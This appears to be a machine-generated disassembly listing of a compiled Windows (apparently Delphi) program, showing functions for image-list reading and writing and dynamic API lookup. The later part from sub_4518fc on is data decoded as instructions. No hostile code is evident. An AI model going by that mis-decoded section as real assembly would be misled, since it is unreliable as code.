mov eax ebx
call sub_450518
pop esi
pop ebx
retn
sub_4506a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_450714
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45071b
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_450748
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_41a468
mov si 0xffff
call sub_403430
inc ebp
dec edi
jne r-xdata
sub_450798
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a358
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a468
cmp ebp eax
jne r-xdata
sub_4507f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_40809c
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_450834
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_450010
mov ebx eax
mov eax edi
call sub_450010
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_450010
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_450910
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4508f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4507f0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4508fa
mov eax [ ebp - 0xc ]
call sub_403234
retn
mov eax edi
call sub_450010
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_450924
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_450010
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_450834
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_450980
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_420a8c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_450924
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4509d8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41c6d8
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41c6d8
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_450c5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c4ac
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41c4cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_450c3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42a014
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_419034
mov eax [ ebp - 0x4 ]
call sub_451004
xor eax eax
push ebp
push sub_450c22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c29
mov eax [ ebp - 0xc ]
call sub_403234
mov eax [ ebp - 0x14 ]
call sub_403234
mov eax [ ebp - 0x4 ]
call sub_451008
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_41905c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4292a4
push eax
mov eax [ ebp - 0xc ]
call sub_4292a4
lea edx [ ebp - 0x30 ]
pop ecx
call sub_4244e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_41905c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4292a4
push eax
mov eax [ ebp - 0x14 ]
call sub_4292a4
lea edx [ ebp - 0x30 ]
pop ecx
call sub_4244e0
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44ff44
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_450c6c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421220
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_450ccc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44fddc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450cd3
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub eax 0xffffffec
sub_450cd3
mov eax [ ebp - 0x4 ]
call sub_44fccc
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_450e02
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41c4cc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41cbd4
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41c4cc
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403234
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41c4cc
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421220
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_450de5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41c4cc
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44fddc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41c4cc
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_450e34
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44fe6c
mov eax edi
call sub_41c4ac
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41c4cc
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_4509d8
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_450c6c
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_450ec0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421220
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450fba
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c260
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44fe08
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44fe08
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450fc1
mov eax [ ebp - 0x4 ]
call sub_403234
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
jmp r-xdata
sub_451028
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
mov edx esi
call sub_450798
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_451074
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_451099
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4510a0
retn
sub_4518fc
out dx eax
[ eax ]
pop ebp
inc ebp
add [ eax + 0x5d ] al
inc ebp
add [ eax ] ch
popad
inc ebp
add [ 0x6e654d54 ] al
jne r-xdata
add eax 0x756e654d
jae r-xdata
sbb [ ebp ] eax
pop es
add eax 0x6e654d54
jne r-xdata
sbb al 0x15
inc ebp
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
jae r-xdata
add [ edx + 0x340045 ] bl
mov al 0xe
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ eax + 0x4400420e ] bh
pop esp
inc ebp
add al dh
inc ebp
sbb [ ebp ] al
xor [ esi + 0x30041 ] cl
add [ ebx * 2 + 0x65200045 ] dh
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
cmp al 0x0
add [ eax ] al
add eax [ eax ]
std
inc eax
add [ ecx + ebx + 0x45 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_455e7e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
sbb [ ebp ] eax
pushad
add [ eax ] al
add [ eax + ebx + 0x45 ] bl
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
pop es
inc edx
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffe04559ca
pop esp
inc ebp
add [ eax - 0x55 ] cl
inc ecx
add [ edx + ecx - 0x559bffbe ] cl
inc ecx
add [ eax ] cl
inc ebp
add [ ebp + 0xb740045 ] ah
inc edx
add [ esp + ecx + 0x42 ] ch
add [ eax - 0x7bffbdf2 ] dh
or eax [ edx ]
jl r-xdata
inc ebp
add al ah
push 0x45
add [ edx + ebp * 2 ] ah
inc ebp
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
shr al 0x19
inc ebp
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0x9c756e65
sbb [ ebp ] eax
adc [ ecx ] bl
inc ebp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
inc edx
add [ eax + 0x4400420e ] bh
pop esp
inc ebp
add al dh
add ah dl
imul eax [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] bh
adc eax [ ebp ]
les ebp [ ecx + 0x45 ]
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
[ esp ]
jns r-xdata
cmp [ ebx ] dl
inc ebp
add ah ah
imul eax [ ebp ] sub_4569f4
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
insd
popad
jae r-xdata
dec ecx
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
inc [ edx + ebp * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
inc eax
add [ ecx ] al
add bh bh
pushad
imul eax [ ebp ] 0x1
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf065646f
cli
inc esp
add [ eax ] cl
add bh bh
push 0x1004565
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
and [ gs : ecx + 0x41 ] bh
add [ eax ] dh
add [ eax ] al
dec [ ecx + ebp * 2 + 0x45 ]
add [ edx + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
mov al 0x1b
inc ebp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dh
sbb eax [ ebp ]
push es
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4465646f
adc [ ebp ] eax
push eax
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
xor al 0x1b
inc ebp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
jmp [ eax + 0x69 ]
sbb eax [ ebp ]
lea eax [ eax ]
sbb [ eax * 2 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x1c
inc ebp
outsd
je r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
mov ah 0x1b
inc ebp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jo r-xdata
or dl [ eax + edx * 2 + 0x6f ]
add [ eax - 0x55 ] cl
inc ecx
add [ edx + ecx - 0x559bffbe ] cl
inc ecx
add [ eax ] cl
inc ebp
add [ ebp + 0xb740045 ] ah
inc edx
add [ esp + ecx + 0x42 ] ch
add [ eax - 0x7bffbdf2 ] dh
or eax [ edx ]
jl r-xdata
or eax 0x6f42616d
insd
inc ebp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
inc ebp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add ah ah
imul eax [ ebp ] sub_4569f4
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ebp
add [ ebx * 2 + 0x65200045 ] dh
inc ebp
add [ edx + esi * 2 ] dl
inc ebp
add ah cl
jb r-xdata
inc edx
add [ eax + 0x6c00420e ] bh
jno r-xdata
add al ch
xor [ eax ] eax
loopne r-xdata
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
sbb al 0x45
add [ eax ] bh
add [ eax ] al
pop esp
sbb [ ebp ] al
outsd
inc edx
outsd
je r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add ah al
imul eax [ ebp ] sub_4569d4
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
jo r-xdata
add [ edx ] cl
push esp
push eax
outsd
inc ebp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al dh
jae r-xdata
inc ebp
jae r-xdata
add eax 0x756e654d
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
outsd
insd
outsd
sbb al 0x1c
inc ebp
je r-xdata
jne r-xdata
jo r-xdata
je r-xdata
outsb
jne r-xdata
outsd
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
cwde
aam 0x1c
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
cmp [ ebx ] dl
inc ebp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sbb eax [ ebp ]
pushad
add [ eax ] al
jmp [ eax ]
outsb
sbb eax [ ebp ]
add ecx [ edi ]
pop es
inc edx
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffe0455cae
jno r-xdata
xor al 0x40
add al bl
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax - 0x72ffbae5 ] esi
inc eax
add [ eax + 0x451c ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
sbb al 0x45
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x1b ] dh
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
sub al 0x64
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jae r-xdata
add [ eax ] ch
jb r-xdata
jns r-xdata
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
jmp [ eax + 0x69 ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
ja r-xdata
jns r-xdata
cld
jns r-xdata
inc ecx
add [ 0x756e654d ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x45
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ eax ] al
[ ecx ]
add [ eax ] dh
jb r-xdata
cld
cmp [ ebx ] dl
inc ebp
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
pop ds
inc ebp
add [ eax ] cl
add [ eax ] al
add [ eax - 0x4f ] al
inc edx
jo r-xdata
inc ebx
push 0x65676e61
push 0x7000417a
add [ eax ] al
push [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7065646f
sbb eax [ ebp ]
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add ah ch
outsb
outsb
inc esp
adc [ ebp ] eax
push eax
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
dec edi
adc [ eax ] al
inc ecx
add [ eax ] al
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xfc65646f
add [ eax ] dh
add [ eax ] al
dec [ ecx + ebp * 2 + 0x45 ]
add [ edx + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
or al [ eax ]
or eax 0x756e654d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
push cs
inc edx
add [ eax - 0x27ffbfcc ] cl
sbb al 0x45
add [ eax ] dl
sbb [ ebp ] eax
adc [ eax ] al
add eax 0x756e654d
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
jg r-xdata
shl [ edi + ebx ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
